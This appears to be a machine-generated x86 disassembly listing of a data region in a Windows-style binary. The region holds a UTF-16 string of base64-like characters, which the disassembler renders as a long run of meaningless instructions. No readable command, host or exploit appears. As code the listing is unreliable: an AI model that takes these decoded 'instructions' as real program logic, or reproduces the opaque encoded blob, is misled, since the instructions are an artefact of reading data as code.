  40aa15:	00 35 00 6c 00 4f    	add    %dh,0x4f006c00
  40aa1b:	00 46 00             	add    %al,0x0(%esi)
  40aa1e:	57                   	push   %edi
  40aa1f:	00 58 00             	add    %bl,0x0(%eax)
  40aa22:	63 00                	arpl   %eax,(%eax)
  40aa24:	54                   	push   %esp
  40aa25:	00 62 00             	add    %ah,0x0(%edx)
  40aa28:	38 00                	cmp    %al,(%eax)
  40aa2a:	34 00                	xor    $0x0,%al
  40aa2c:	6b 00 48             	imul   $0x48,(%eax),%eax
  40aa2f:	00 55 00             	add    %dl,0x0(%ebp)
  40aa32:	63 00                	arpl   %eax,(%eax)
  40aa34:	46                   	inc    %esi
  40aa35:	00 53 00             	add    %dl,0x0(%ebx)
  40aa38:	4b                   	dec    %ebx
  40aa39:	00 56 00             	add    %dl,0x0(%esi)
  40aa3c:	63 00                	arpl   %eax,(%eax)
  40aa3e:	6b 00 49             	imul   $0x49,(%eax),%eax
  40aa41:	00 51 00             	add    %dl,0x0(%ecx)
  40aa44:	6c                   	insb   (%dx),%es:(%edi)
  40aa45:	00 57 00             	add    %dl,0x0(%edi)
  40aa48:	57                   	push   %edi
  40aa49:	00 38                	add    %bh,(%eax)
  40aa4b:	00 50 00             	add    %dl,0x0(%eax)
  40aa4e:	67 00 63 00          	add    %ah,0x0(%bp,%di)
  40aa52:	7a 00                	jp     0x40aa54
  40aa54:	39 00                	cmp    %eax,(%eax)
  40aa56:	75 00                	jne    0x40aa58
  40aa58:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa59:	00 61 00             	add    %ah,0x0(%ecx)
  40aa5c:	58                   	pop    %eax
  40aa5d:	00 51 00             	add    %dl,0x0(%ecx)
  40aa60:	4e                   	dec    %esi
  40aa61:	00 63 00             	add    %ah,0x0(%ebx)
  40aa64:	78 00                	js     0x40aa66
  40aa66:	7a 00                	jp     0x40aa68
  40aa68:	63 00                	arpl   %eax,(%eax)
  40aa6a:	59                   	pop    %ecx
  40aa6b:	00 4a 00             	add    %cl,0x0(%edx)
  40aa6e:	52                   	push   %edx
  40aa6f:	00 46 00             	add    %al,0x0(%esi)
  40aa72:	33 00                	xor    (%eax),%eax
  40aa74:	48                   	dec    %eax
  40aa75:	00 51 00             	add    %dl,0x0(%ecx)
  40aa78:	2f                   	das
  40aa79:	00 33                	add    %dh,(%ebx)
  40aa7b:	00 56 00             	add    %dl,0x0(%esi)
  40aa7e:	42                   	inc    %edx
  40aa7f:	00 30                	add    %dh,(%eax)
  40aa81:	00 6c 00 2f          	add    %ch,0x2f(%eax,%eax,1)
  40aa85:	00 65 00             	add    %ah,0x0(%ebp)
  40aa88:	56                   	push   %esi
  40aa89:	00 70 00             	add    %dh,0x0(%eax)
  40aa8c:	5a                   	pop    %edx
  40aa8d:	00 4a 00             	add    %cl,0x0(%edx)
  40aa90:	39 00                	cmp    %eax,(%eax)
  40aa92:	30 00                	xor    %al,(%eax)
  40aa94:	71 00                	jno    0x40aa96
  40aa96:	76 00                	jbe    0x40aa98
  40aa98:	4a                   	dec    %edx
  40aa99:	00 31                	add    %dh,(%ecx)
  40aa9b:	00 70 00             	add    %dh,0x0(%eax)
  40aa9e:	5a                   	pop    %edx
  40aa9f:	00 54 00 53          	add    %dl,0x53(%eax,%eax,1)
  40aaa3:	00 6b 00             	add    %ch,0x0(%ebx)
  40aaa6:	75 00                	jne    0x40aaa8
  40aaa8:	49                   	dec    %ecx
  40aaa9:	00 4a 00             	add    %cl,0x0(%edx)
  40aaac:	4a                   	dec    %edx
  40aaad:	00 4b 00             	add    %cl,0x0(%ebx)
  40aab0:	4b                   	dec    %ebx
  40aab1:	00 69 00             	add    %ch,0x0(%ecx)
  40aab4:	6e                   	outsb  %ds:(%esi),(%dx)
  40aab5:	00 72 00             	add    %dh,0x0(%edx)
  40aab8:	44                   	inc    %esp
  40aab9:	00 6d 00             	add    %ch,0x0(%ebp)
  40aabc:	59                   	pop    %ecx
  40aabd:	00 2f                	add    %ch,(%edi)
  40aabf:	00 35 00 2f 00 34    	add    %dh,0x34002f00
  40aac5:	00 6f 00             	add    %ch,0x0(%edi)
  40aac8:	76 00                	jbe    0x40aaca
  40aaca:	67 00 4d 00          	add    %cl,0x0(%di)
  40aace:	57                   	push   %edi
  40aacf:	00 56 00             	add    %dl,0x0(%esi)
  40aad2:	75 00                	jne    0x40aad4
  40aad4:	54                   	push   %esp
  40aad5:	00 6d 00             	add    %ch,0x0(%ebp)
  40aad8:	6a 00                	push   $0x0
  40aada:	4c                   	dec    %esp
  40aadb:	00 6d 00             	add    %ch,0x0(%ebp)
  40aade:	4e                   	dec    %esi
  40aadf:	00 42 00             	add    %al,0x0(%edx)
  40aae2:	76 00                	jbe    0x40aae4
  40aae4:	49                   	dec    %ecx
  40aae5:	00 79 00             	add    %bh,0x0(%ecx)
  40aae8:	4e                   	dec    %esi
  40aae9:	00 65 00             	add    %ah,0x0(%ebp)
  40aaec:	45                   	inc    %ebp
  40aaed:	00 62 00             	add    %ah,0x0(%edx)
  40aaf0:	75 00                	jne    0x40aaf2
  40aaf2:	4d                   	dec    %ebp
  40aaf3:	00 33                	add    %dh,(%ebx)
  40aaf5:	00 31                	add    %dh,(%ecx)
  40aaf7:	00 6a 00             	add    %ch,0x0(%edx)
  40aafa:	78 00                	js     0x40aafc
  40aafc:	57                   	push   %edi
  40aafd:	00 70 00             	add    %dh,0x0(%eax)
  40ab00:	6b 00 6e             	imul   $0x6e,(%eax),%eax
  40ab03:	00 39                	add    %bh,(%ecx)
  40ab05:	00 57 00             	add    %dl,0x0(%edi)
  40ab08:	6a 00                	push   $0x0
  40ab0a:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab0b:	00 66 00             	add    %ah,0x0(%esi)
  40ab0e:	44                   	inc    %esp
  40ab0f:	00 66 00             	add    %ah,0x0(%esi)
  40ab12:	6b 00 75             	imul   $0x75,(%eax),%eax
  40ab15:	00 64 00 58          	add    %ah,0x58(%eax,%eax,1)
  40ab19:	00 31                	add    %dh,(%ecx)
  40ab1b:	00 4a 00             	add    %cl,0x0(%edx)
  40ab1e:	49                   	dec    %ecx
  40ab1f:	00 6e 00             	add    %ch,0x0(%esi)
  40ab22:	30 00                	xor    %al,(%eax)
  40ab24:	77 00                	ja     0x40ab26
  40ab26:	47                   	inc    %edi
  40ab27:	00 37                	add    %dh,(%edi)
  40ab29:	00 76 00             	add    %dh,0x0(%esi)
  40ab2c:	48                   	dec    %eax
  40ab2d:	00 47 00             	add    %al,0x0(%edi)
  40ab30:	51                   	push   %ecx
  40ab31:	00 42 00             	add    %al,0x0(%edx)
  40ab34:	37                   	aaa
  40ab35:	00 72 00             	add    %dh,0x0(%edx)
  40ab38:	2b 00                	sub    (%eax),%eax
  40ab3a:	4f                   	dec    %edi
  40ab3b:	00 51 00             	add    %dl,0x0(%ecx)
  40ab3e:	38 00                	cmp    %al,(%eax)
  40ab40:	77 00                	ja     0x40ab42
  40ab42:	69 00 49 00 4f 00    	imul   $0x4f0049,(%eax),%eax
  40ab48:	4a                   	dec    %edx
  40ab49:	00 36                	add    %dh,(%esi)
  40ab4b:	00 33                	add    %dh,(%ebx)
  40ab4d:	00 73 00             	add    %dh,0x0(%ebx)
  40ab50:	68 00 4c 00 75       	push   $0x75004c00
  40ab55:	00 55 00             	add    %dl,0x0(%ebp)
  40ab58:	63 00                	arpl   %eax,(%eax)
  40ab5a:	70 00                	jo     0x40ab5c
  40ab5c:	4f                   	dec    %edi
  40ab5d:	00 51 00             	add    %dl,0x0(%ecx)
  40ab60:	45                   	inc    %ebp
  40ab61:	00 6b 00             	add    %ch,0x0(%ebx)
  40ab64:	63 00                	arpl   %eax,(%eax)
  40ab66:	42                   	inc    %edx
  40ab67:	00 6a 00             	add    %ch,0x0(%edx)
  40ab6a:	32 00                	xor    (%eax),%al
  40ab6c:	4c                   	dec    %esp
  40ab6d:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40ab71:	00 5a 00             	add    %bl,0x0(%edx)
  40ab74:	4b                   	dec    %ebx
  40ab75:	00 4c 00 56          	add    %cl,0x56(%eax,%eax,1)
  40ab79:	00 53 00             	add    %dl,0x0(%ebx)
  40ab7c:	76 00                	jbe    0x40ab7e
  40ab7e:	7a 00                	jp     0x40ab80
  40ab80:	62 00                	bound  %eax,(%eax)
  40ab82:	4a                   	dec    %edx
  40ab83:	00 53 00             	add    %dl,0x0(%ebx)
  40ab86:	79 00                	jns    0x40ab88
  40ab88:	6d                   	insl   (%dx),%es:(%edi)
  40ab89:	00 7a 00             	add    %bh,0x0(%edx)
  40ab8c:	30 00                	xor    %al,(%eax)
  40ab8e:	7a 00                	jp     0x40ab90
  40ab90:	69 00 6e 00 44 00    	imul   $0x44006e,(%eax),%eax
  40ab96:	77 00                	ja     0x40ab98
  40ab98:	30 00                	xor    %al,(%eax)
  40ab9a:	55                   	push   %ebp
  40ab9b:	00 78 00             	add    %bh,0x0(%eax)
  40ab9e:	31 00                	xor    %eax,(%eax)
  40aba0:	56                   	push   %esi
  40aba1:	00 56 00             	add    %dl,0x0(%esi)
  40aba4:	74 00                	je     0x40aba6
  40aba6:	62 00                	bound  %eax,(%eax)
  40aba8:	39 00                	cmp    %eax,(%eax)
  40abaa:	58                   	pop    %eax
  40abab:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  40abaf:	00 66 00             	add    %ah,0x0(%esi)
  40abb2:	6b 00 65             	imul   $0x65,(%eax),%eax
  40abb5:	00 48 00             	add    %cl,0x0(%eax)
  40abb8:	4d                   	dec    %ebp
  40abb9:	00 35 00 35 00 70    	add    %dh,0x70003500
  40abbf:	00 69 00             	add    %ch,0x0(%ecx)
  40abc2:	50                   	push   %eax
  40abc3:	00 2b                	add    %ch,(%ebx)
  40abc5:	00 6a 00             	add    %ch,0x0(%edx)
  40abc8:	44                   	inc    %esp
  40abc9:	00 52 00             	add    %dl,0x0(%edx)
  40abcc:	37                   	aaa
  40abcd:	00 2f                	add    %ch,(%edi)
  40abcf:	00 62 00             	add    %ah,0x0(%edx)
  40abd2:	73 00                	jae    0x40abd4
  40abd4:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40abd8:	63 00                	arpl   %eax,(%eax)
  40abda:	56                   	push   %esi
  40abdb:	00 78 00             	add    %bh,0x0(%eax)
  40abde:	36 00 73 00          	add    %dh,%ss:0x0(%ebx)
  40abe2:	5a                   	pop    %edx
  40abe3:	00 39                	add    %bh,(%ecx)
  40abe5:	00 47 00             	add    %al,0x0(%edi)
  40abe8:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
  40abec:	36 00 4b 00          	add    %cl,%ss:0x0(%ebx)
  40abf0:	4d                   	dec    %ebp
  40abf1:	00 46 00             	add    %al,0x0(%esi)
  40abf4:	77 00                	ja     0x40abf6
  40abf6:	6d                   	insl   (%dx),%es:(%edi)
  40abf7:	00 65 00             	add    %ah,0x0(%ebp)
  40abfa:	77 00                	ja     0x40abfc
  40abfc:	58                   	pop    %eax
  40abfd:	00 33                	add    %dh,(%ebx)
  40abff:	00 6b 00             	add    %ch,0x0(%ebx)
  40ac02:	6b 00 51             	imul   $0x51,(%eax),%eax
  40ac05:	00 6b 00             	add    %ch,0x0(%ebx)
  40ac08:	41                   	inc    %ecx
  40ac09:	00 78 00             	add    %bh,0x0(%eax)
  40ac0c:	7a 00                	jp     0x40ac0e
  40ac0e:	48                   	dec    %eax
  40ac0f:	00 44 00 35          	add    %al,0x35(%eax,%eax,1)
  40ac13:	00 62 00             	add    %ah,0x0(%edx)
  40ac16:	4f                   	dec    %edi
  40ac17:	00 6a 00             	add    %ch,0x0(%edx)
  40ac1a:	67 00 54 00          	add    %dl,0x0(%si)
  40ac1e:	30 00                	xor    %al,(%eax)
  40ac20:	45                   	inc    %ebp
  40ac21:	00 71 00             	add    %dh,0x0(%ecx)
  40ac24:	41                   	inc    %ecx
  40ac25:	00 6f 00             	add    %ch,0x0(%edi)
  40ac28:	47                   	inc    %edi
  40ac29:	00 62 00             	add    %ah,0x0(%edx)
  40ac2c:	66 00 31             	data16 add %dh,(%ecx)
  40ac2f:	00 47 00             	add    %al,0x0(%edi)
  40ac32:	78 00                	js     0x40ac34
  40ac34:	2f                   	das
  40ac35:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ac38:	7a 00                	jp     0x40ac3a
  40ac3a:	45                   	inc    %ebp
  40ac3b:	00 57 00             	add    %dl,0x0(%edi)
  40ac3e:	6a 00                	push   $0x0
  40ac40:	41                   	inc    %ecx
  40ac41:	00 32                	add    %dh,(%edx)
  40ac43:	00 54 00 72          	add    %dl,0x72(%eax,%eax,1)
  40ac47:	00 44 00 36          	add    %al,0x36(%eax,%eax,1)
  40ac4b:	00 62 00             	add    %ah,0x0(%edx)
  40ac4e:	41                   	inc    %ecx
  40ac4f:	00 79 00             	add    %bh,0x0(%ecx)
  40ac52:	30 00                	xor    %al,(%eax)
  40ac54:	63 00                	arpl   %eax,(%eax)
  40ac56:	58                   	pop    %eax
  40ac57:	00 33                	add    %dh,(%ebx)
  40ac59:	00 6e 00             	add    %ch,0x0(%esi)
  40ac5c:	53                   	push   %ebx
  40ac5d:	00 51 00             	add    %dl,0x0(%ecx)
  40ac60:	39 00                	cmp    %eax,(%eax)
  40ac62:	75 00                	jne    0x40ac64
  40ac64:	41                   	inc    %ecx
  40ac65:	00 45 00             	add    %al,0x0(%ebp)
  40ac68:	53                   	push   %ebx
  40ac69:	00 4d 00             	add    %cl,0x0(%ebp)
  40ac6c:	45                   	inc    %ebp
  40ac6d:	00 61 00             	add    %ah,0x0(%ecx)
  40ac70:	4e                   	dec    %esi
  40ac71:	00 43 00             	add    %al,0x0(%ebx)
  40ac74:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac75:	00 47 00             	add    %al,0x0(%edi)
  40ac78:	68 00 32 00 5a       	push   $0x5a003200
  40ac7d:	00 36                	add    %dh,(%esi)
  40ac7f:	00 41 00             	add    %al,0x0(%ecx)
  40ac82:	68 00 76 00 43       	push   $0x43007600
  40ac87:	00 2f                	add    %ch,(%edi)
  40ac89:	00 73 00             	add    %dh,0x0(%ebx)
  40ac8c:	71 00                	jno    0x40ac8e
  40ac8e:	50                   	push   %eax
  40ac8f:	00 58 00             	add    %bl,0x0(%eax)
  40ac92:	51                   	push   %ecx
  40ac93:	00 67 00             	add    %ah,0x0(%edi)
  40ac96:	45                   	inc    %ebp
  40ac97:	00 37                	add    %dh,(%edi)
  40ac99:	00 52 00             	add    %dl,0x0(%edx)
  40ac9c:	2b 00                	sub    (%eax),%eax
  40ac9e:	49                   	dec    %ecx
  40ac9f:	00 65 00             	add    %ah,0x0(%ebp)
  40aca2:	44                   	inc    %esp
  40aca3:	00 51 00             	add    %dl,0x0(%ecx)
  40aca6:	30 00                	xor    %al,(%eax)
  40aca8:	48                   	dec    %eax
  40aca9:	00 69 00             	add    %ch,0x0(%ecx)
  40acac:	65 00 51 00          	add    %dl,%gs:0x0(%ecx)
  40acb0:	4e                   	dec    %esi
  40acb1:	00 66 00             	add    %ah,0x0(%esi)
  40acb4:	42                   	inc    %edx
  40acb5:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  40acb9:	00 6f 00             	add    %ch,0x0(%edi)
  40acbc:	77 00                	ja     0x40acbe
  40acbe:	6f                   	outsl  %ds:(%esi),(%dx)
  40acbf:	00 7a 00             	add    %bh,0x0(%edx)
  40acc2:	42                   	inc    %edx
  40acc3:	00 75 00             	add    %dh,0x0(%ebp)
  40acc6:	6f                   	outsl  %ds:(%esi),(%dx)
  40acc7:	00 34 00             	add    %dh,(%eax,%eax,1)
  40acca:	63 00                	arpl   %eax,(%eax)
  40accc:	65 00 4d 00          	add    %cl,%gs:0x0(%ebp)
  40acd0:	43                   	inc    %ebx
  40acd1:	00 52 00             	add    %dl,0x0(%edx)
  40acd4:	35 00 59 00 79       	xor    $0x79005900,%eax
  40acd9:	00 4b 00             	add    %cl,0x0(%ebx)
  40acdc:	4f                   	dec    %edi
  40acdd:	00 31                	add    %dh,(%ecx)
  40acdf:	00 75 00             	add    %dh,0x0(%ebp)
  40ace2:	42                   	inc    %edx
  40ace3:	00 2f                	add    %ch,(%edi)
  40ace5:	00 6c 00 31          	add    %ch,0x31(%eax,%eax,1)
  40ace9:	00 52 00             	add    %dl,0x0(%edx)
  40acec:	65 00 59 00          	add    %bl,%gs:0x0(%ecx)
  40acf0:	53                   	push   %ebx
  40acf1:	00 41 00             	add    %al,0x0(%ecx)
  40acf4:	74 00                	je     0x40acf6
  40acf6:	48                   	dec    %eax
  40acf7:	00 4c 00 6a          	add    %cl,0x6a(%eax,%eax,1)
  40acfb:	00 75 00             	add    %dh,0x0(%ebp)
  40acfe:	52                   	push   %edx
  40acff:	00 44 00 72          	add    %al,0x72(%eax,%eax,1)
  40ad03:	00 70 00             	add    %dh,0x0(%eax)
  40ad06:	77 00                	ja     0x40ad08
  40ad08:	76 00                	jbe    0x40ad0a
  40ad0a:	34 00                	xor    $0x0,%al
  40ad0c:	4b                   	dec    %ebx
  40ad0d:	00 2b                	add    %ch,(%ebx)
  40ad0f:	00 42 00             	add    %al,0x0(%edx)
  40ad12:	75 00                	jne    0x40ad14
  40ad14:	2f                   	das
  40ad15:	00 72 00             	add    %dh,0x0(%edx)
  40ad18:	35 00 46 00 74       	xor    $0x74004600,%eax
  40ad1d:	00 57 00             	add    %dl,0x0(%edi)
  40ad20:	38 00                	cmp    %al,(%eax)
  40ad22:	32 00                	xor    (%eax),%al
  40ad24:	67 00 47 00          	add    %al,0x0(%bx)
  40ad28:	78 00                	js     0x40ad2a
  40ad2a:	76 00                	jbe    0x40ad2c
  40ad2c:	65 00 59 00          	add    %bl,%gs:0x0(%ecx)
  40ad30:	30 00                	xor    %al,(%eax)
  40ad32:	39 00                	cmp    %eax,(%eax)
  40ad34:	38 00                	cmp    %al,(%eax)
  40ad36:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad37:	00 5a 00             	add    %bl,0x0(%edx)
  40ad3a:	59                   	pop    %ecx
  40ad3b:	00 76 00             	add    %dh,0x0(%esi)
  40ad3e:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40ad42:	44                   	inc    %esp
  40ad43:	00 6f 00             	add    %ch,0x0(%edi)
  40ad46:	6d                   	insl   (%dx),%es:(%edi)
  40ad47:	00 6f 00             	add    %ch,0x0(%edi)
  40ad4a:	43                   	inc    %ebx
  40ad4b:	00 39                	add    %bh,(%ecx)
  40ad4d:	00 6f 00             	add    %ch,0x0(%edi)
  40ad50:	32 00                	xor    (%eax),%al
  40ad52:	51                   	push   %ecx
  40ad53:	00 43 00             	add    %al,0x0(%ebx)
  40ad56:	7a 00                	jp     0x40ad58
  40ad58:	6c                   	insb   (%dx),%es:(%edi)
  40ad59:	00 4f 00             	add    %cl,0x0(%edi)
  40ad5c:	62 00                	bound  %eax,(%eax)
  40ad5e:	63 00                	arpl   %eax,(%eax)
  40ad60:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad61:	00 69 00             	add    %ch,0x0(%ecx)
  40ad64:	45                   	inc    %ebp
  40ad65:	00 58 00             	add    %bl,0x0(%eax)
  40ad68:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad69:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40ad6d:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ad70:	35 00 63 00 76       	xor    $0x76006300,%eax
  40ad75:	00 4e 00             	add    %cl,0x0(%esi)
  40ad78:	6c                   	insb   (%dx),%es:(%edi)
  40ad79:	00 4c 00 61          	add    %cl,0x61(%eax,%eax,1)
  40ad7d:	00 75 00             	add    %dh,0x0(%ebp)
  40ad80:	50                   	push   %eax
  40ad81:	00 65 00             	add    %ah,0x0(%ebp)
  40ad84:	67 00 2f             	add    %ch,(%bx)
  40ad87:	00 72 00             	add    %dh,0x0(%edx)
  40ad8a:	32 00                	xor    (%eax),%al
  40ad8c:	32 00                	xor    (%eax),%al
  40ad8e:	41                   	inc    %ecx
  40ad8f:	00 36                	add    %dh,(%esi)
  40ad91:	00 64 00 2f          	add    %ah,0x2f(%eax,%eax,1)
  40ad95:	00 35 00 4a 00 44    	add    %dh,0x44004a00
  40ad9b:	00 46 00             	add    %al,0x0(%esi)
  40ad9e:	30 00                	xor    %al,(%eax)
  40ada0:	4e                   	dec    %esi
  40ada1:	00 6c 00 30          	add    %ch,0x30(%eax,%eax,1)
  40ada5:	00 48 00             	add    %cl,0x0(%eax)
  40ada8:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40adac:	4a                   	dec    %edx
  40adad:	00 4a 00             	add    %cl,0x0(%edx)
  40adb0:	65 00 4c 00 39       	add    %cl,%gs:0x39(%eax,%eax,1)
  40adb5:	00 66 00             	add    %ah,0x0(%esi)
  40adb8:	6d                   	insl   (%dx),%es:(%edi)
  40adb9:	00 6e 00             	add    %ch,0x0(%esi)
  40adbc:	70 00                	jo     0x40adbe
  40adbe:	76 00                	jbe    0x40adc0
  40adc0:	31 00                	xor    %eax,(%eax)
  40adc2:	45                   	inc    %ebp
  40adc3:	00 39                	add    %bh,(%ecx)
  40adc5:	00 41 00             	add    %al,0x0(%ecx)
  40adc8:	67 00 2b             	add    %ch,(%bp,%di)
  40adcb:	00 4a 00             	add    %cl,0x0(%edx)
  40adce:	68 00 4e 00 46       	push   $0x46004e00
  40add3:	00 68 00             	add    %ch,0x0(%eax)
  40add6:	66 00 62 00          	data16 add %ah,0x0(%edx)
  40adda:	43                   	inc    %ebx
  40addb:	00 35 00 63 00 4b    	add    %dh,0x4b006300
  40ade1:	00 6d 00             	add    %ch,0x0(%ebp)
  40ade4:	41                   	inc    %ecx
  40ade5:	00 66 00             	add    %ah,0x0(%esi)
  40ade8:	76 00                	jbe    0x40adea
  40adea:	76 00                	jbe    0x40adec
  40adec:	51                   	push   %ecx
  40aded:	00 44 00 76          	add    %al,0x76(%eax,%eax,1)
  40adf1:	00 66 00             	add    %ah,0x0(%esi)
  40adf4:	77 00                	ja     0x40adf6
  40adf6:	36 00 66 00          	add    %ah,%ss:0x0(%esi)
  40adfa:	46                   	inc    %esi
  40adfb:	00 68 00             	add    %ch,0x0(%eax)
  40adfe:	75 00                	jne    0x40ae00
  40ae00:	46                   	inc    %esi
  40ae01:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
  40ae05:	00 47 00             	add    %al,0x0(%edi)
  40ae08:	34 00                	xor    $0x0,%al
  40ae0a:	54                   	push   %esp
  40ae0b:	00 2f                	add    %ch,(%edi)
  40ae0d:	00 2f                	add    %ch,(%edi)
  40ae0f:	00 36                	add    %dh,(%esi)
  40ae11:	00 49 00             	add    %cl,0x0(%ecx)
  40ae14:	55                   	push   %ebp
  40ae15:	00 66 00             	add    %ah,0x0(%esi)
  40ae18:	43                   	inc    %ebx
  40ae19:	00 54 00 51          	add    %dl,0x51(%eax,%eax,1)
  40ae1d:	00 45 00             	add    %al,0x0(%ebp)
  40ae20:	4e                   	dec    %esi
  40ae21:	00 49 00             	add    %cl,0x0(%ecx)
  40ae24:	43                   	inc    %ebx
  40ae25:	00 50 00             	add    %dl,0x0(%eax)
  40ae28:	56                   	push   %esi
  40ae29:	00 35 00 6c 00 46    	add    %dh,0x46006c00
  40ae2f:	00 4a 00             	add    %cl,0x0(%edx)
  40ae32:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae33:	00 51 00             	add    %dl,0x0(%ecx)
  40ae36:	2b 00                	sub    (%eax),%eax
  40ae38:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae39:	00 74 00 62          	add    %dh,0x62(%eax,%eax,1)
  40ae3d:	00 39                	add    %bh,(%ecx)
  40ae3f:	00 67 00             	add    %ah,0x0(%edi)
  40ae42:	4a                   	dec    %edx
  40ae43:	00 4e 00             	add    %cl,0x0(%esi)
  40ae46:	4f                   	dec    %edi
  40ae47:	00 6b 00             	add    %ch,0x0(%ebx)
  40ae4a:	75 00                	jne    0x40ae4c
  40ae4c:	41                   	inc    %ecx
  40ae4d:	00 6c 00 53          	add    %ch,0x53(%eax,%eax,1)
  40ae51:	00 51 00             	add    %dl,0x0(%ecx)
  40ae54:	73 00                	jae    0x40ae56
  40ae56:	67 00 77 00          	add    %dh,0x0(%bx)
  40ae5a:	41                   	inc    %ecx
  40ae5b:	00 78 00             	add    %bh,0x0(%eax)
  40ae5e:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
  40ae62:	45                   	inc    %ebp
  40ae63:	00 61 00             	add    %ah,0x0(%ecx)
  40ae66:	45                   	inc    %ebp
  40ae67:	00 46 00             	add    %al,0x0(%esi)
  40ae6a:	36 00 36             	add    %dh,%ss:(%esi)
  40ae6d:	00 58 00             	add    %bl,0x0(%eax)
  40ae70:	54                   	push   %esp
  40ae71:	00 6b 00             	add    %ch,0x0(%ebx)
  40ae74:	71 00                	jno    0x40ae76
  40ae76:	66 00 33             	data16 add %dh,(%ebx)
  40ae79:	00 57 00             	add    %dl,0x0(%edi)
  40ae7c:	6c                   	insb   (%dx),%es:(%edi)
  40ae7d:	00 62 00             	add    %ah,0x0(%edx)
  40ae80:	76 00                	jbe    0x40ae82
  40ae82:	4e                   	dec    %esi
  40ae83:	00 6a 00             	add    %ch,0x0(%edx)
  40ae86:	2b 00                	sub    (%eax),%eax
  40ae88:	76 00                	jbe    0x40ae8a
  40ae8a:	45                   	inc    %ebp
  40ae8b:	00 46 00             	add    %al,0x0(%esi)
  40ae8e:	37                   	aaa
  40ae8f:	00 50 00             	add    %dl,0x0(%eax)
  40ae92:	2b 00                	sub    (%eax),%eax
  40ae94:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae95:	00 61 00             	add    %ah,0x0(%ecx)
  40ae98:	7a 00                	jp     0x40ae9a
  40ae9a:	55                   	push   %ebp
  40ae9b:	00 57 00             	add    %dl,0x0(%edi)
  40ae9e:	33 00                	xor    (%eax),%eax
  40aea0:	6d                   	insl   (%dx),%es:(%edi)
  40aea1:	00 39                	add    %bh,(%ecx)
  40aea3:	00 62 00             	add    %ah,0x0(%edx)
  40aea6:	7a 00                	jp     0x40aea8
  40aea8:	45                   	inc    %ebp
  40aea9:	00 6c 00 54          	add    %ch,0x54(%eax,%eax,1)
  40aead:	00 49 00             	add    %cl,0x0(%ecx)
  40aeb0:	37                   	aaa
  40aeb1:	00 67 00             	add    %ah,0x0(%edi)
  40aeb4:	2f                   	das
  40aeb5:	00 4b 00             	add    %cl,0x0(%ebx)
  40aeb8:	4f                   	dec    %edi
  40aeb9:	00 6c 00 32          	add    %ch,0x32(%eax,%eax,1)
  40aebd:	00 77 00             	add    %dh,0x0(%edi)
  40aec0:	35 00 4e 00 6f       	xor    $0x6f004e00,%eax
  40aec5:	00 58 00             	add    %bl,0x0(%eax)
  40aec8:	61                   	popa
  40aec9:	00 59 00             	add    %bl,0x0(%ecx)
  40aecc:	2b 00                	sub    (%eax),%eax
  40aece:	32 00                	xor    (%eax),%al
  40aed0:	4c                   	dec    %esp
  40aed1:	00 6e 00             	add    %ch,0x0(%esi)
  40aed4:	4e                   	dec    %esi
  40aed5:	00 37                	add    %dh,(%edi)
  40aed7:	00 49 00             	add    %cl,0x0(%ecx)
  40aeda:	2f                   	das
  40aedb:	00 4d 00             	add    %cl,0x0(%ebp)
  40aede:	36 00 6b 00          	add    %ch,%ss:0x0(%ebx)
  40aee2:	62 00                	bound  %eax,(%eax)
  40aee4:	51                   	push   %ecx
  40aee5:	00 30                	add    %dh,(%eax)
  40aee7:	00 61 00             	add    %ah,0x0(%ecx)
  40aeea:	46                   	inc    %esi
  40aeeb:	00 59 00             	add    %bl,0x0(%ecx)
  40aeee:	35 00 66 00 76       	xor    $0x76006600,%eax
  40aef3:	00 5a 00             	add    %bl,0x0(%edx)
  40aef6:	6b 00 69             	imul   $0x69,(%eax),%eax
  40aef9:	00 48 00             	add    %cl,0x0(%eax)
  40aefc:	6f                   	outsl  %ds:(%esi),(%dx)
  40aefd:	00 6c 00 72          	add    %ch,0x72(%eax,%eax,1)
  40af01:	00 46 00             	add    %al,0x0(%esi)
  40af04:	42                   	inc    %edx
  40af05:	00 68 00             	add    %ch,0x0(%eax)
  40af08:	68 00 4d 00 44       	push   $0x44004d00
  40af0d:	00 51 00             	add    %dl,0x0(%ecx)
  40af10:	71 00                	jno    0x40af12
  40af12:	42                   	inc    %edx
  40af13:	00 65 00             	add    %ah,0x0(%ebp)
  40af16:	4d                   	dec    %ebp
  40af17:	00 46 00             	add    %al,0x0(%esi)
  40af1a:	71 00                	jno    0x40af1c
  40af1c:	33 00                	xor    (%eax),%eax
  40af1e:	4d                   	dec    %ebp
  40af1f:	00 36                	add    %dh,(%esi)
  40af21:	00 37                	add    %dh,(%edi)
  40af23:	00 2b                	add    %ch,(%ebx)
  40af25:	00 4d 00             	add    %cl,0x0(%ebp)
  40af28:	56                   	push   %esi
  40af29:	00 57 00             	add    %dl,0x0(%edi)
  40af2c:	7a 00                	jp     0x40af2e
  40af2e:	79 00                	jns    0x40af30
  40af30:	67 00 65 00          	add    %ah,0x0(%di)
  40af34:	67 00 64 00          	add    %ah,0x0(%si)
  40af38:	69 00 5a 00 71 00    	imul   $0x71005a,(%eax),%eax
  40af3e:	43                   	inc    %ebx
  40af3f:	00 37                	add    %dh,(%edi)
  40af41:	00 37                	add    %dh,(%edi)
  40af43:	00 32                	add    %dh,(%edx)
  40af45:	00 57 00             	add    %dl,0x0(%edi)
  40af48:	4d                   	dec    %ebp
  40af49:	00 31                	add    %dh,(%ecx)
  40af4b:	00 36                	add    %dh,(%esi)
  40af4d:	00 79 00             	add    %bh,0x0(%ecx)
  40af50:	4f                   	dec    %edi
